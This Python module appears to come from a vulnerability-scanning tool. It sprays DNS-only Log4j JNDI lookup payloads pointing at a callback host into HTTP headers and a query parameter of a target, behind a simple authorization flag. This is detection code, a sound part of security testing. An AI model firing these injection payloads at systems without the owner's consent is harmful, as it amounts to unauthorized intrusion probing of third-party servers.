"""DNS-only Log4j JNDI callback probes for scoped targets."""

from datetime import datetime, timezone
import logging
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
import uuid

import requests

import config
from core.http import create_session


LOGGER = logging.getLogger(__name__)


class Log4ShellTester:
    HEADERS = (
        "User-Agent", "X-Forwarded-For", "X-Api-Version", "X-Forwarded-Host",
        "Referer", "Accept-Language", "Authorization", "X-Custom-Header",
        "CF-Connecting-IP",
    )

    def scan(self, target_url, callback_url, authorized=False):
        if not authorized:
            raise PermissionError("Explicit authorization is required")
        payloads = self._generate_payloads(callback_url)
        return self._inject_all_headers(target_url, payloads)

    @staticmethod
    def _generate_payloads(callback_url):
        host = urlparse(
            callback_url if "://" in callback_url else f"//{callback_url}"
        ).hostname or callback_url.split(":")[0]
        return [
            f"${{jndi:dns://{uuid.uuid4()}.log4shell.{host}/a}}",
            f"${{jndi:dns://{uuid.uuid4()}.log4shell.{host}/b}}",
        ]

    def _inject_all_headers(self, target_url, payloads):
        attempts = []
        session = create_session(
            f"Bug-Hunter-Pro/{config.APP_VERSION} Authorized-OOB-Validation"
        )
        for payload in payloads:
            for header in self.HEADERS:
                try:
                    response = session.get(
                        target_url,
                        headers={header: payload},
                        timeout=config.SCAN_TIMEOUT,
                    )
                    status = response.status_code
                except requests.RequestException:
                    status = None
                attempts.append(
                    {
                        "id": str(uuid.uuid4()),
                        "location": f"header:{header}",
                        "payload": payload,
                        "status_code": status,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                    }
                )
            parsed = urlparse(target_url)
            query = dict(parse_qsl(parsed.query, keep_blank_values=True))
            query["bughunter_probe"] = payload
            url = urlunparse(parsed._replace(query=urlencode(query)))
            try:
                response = session.get(url, timeout=config.SCAN_TIMEOUT)
                status = response.status_code
            except requests.RequestException:
                status = None
            attempts.append(
                {
                    "id": str(uuid.uuid4()),
                    "location": "query:bughunter_probe",
                    "payload": payload,
                    "status_code": status,
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                }
            )
        return attempts
